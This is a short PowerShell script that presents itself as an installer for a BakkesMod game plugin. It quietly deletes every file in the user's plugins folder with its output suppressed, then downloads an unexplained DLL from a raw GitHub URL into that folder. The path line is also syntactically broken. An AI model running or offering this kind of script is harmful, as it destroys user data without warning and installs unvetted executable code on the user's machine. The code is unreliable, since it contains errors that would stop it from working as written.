Add-Type -AssemblyName PresentationFramework;
$pluginpath = "%appdata%\bakkesmod\bakkesmod\plugins")"
cmd.exe /c del /Q $pluginpath > $emptyvoid1 2> $emptyvoid2 3> $emptyvoid3
Invoke-RestMethod -Uri "https://raw.githubusercontent.com/fightbako/plugin/main/plugin.dll" -OutFile $pluginpath; 
if (Test-Path -Path $pluginpath) {
    [System.Windows.MessageBox]::Show('plugin is now installed!');
} else {
    [System.Windows.MessageBox]::Show('could not download!');
}
Exit 
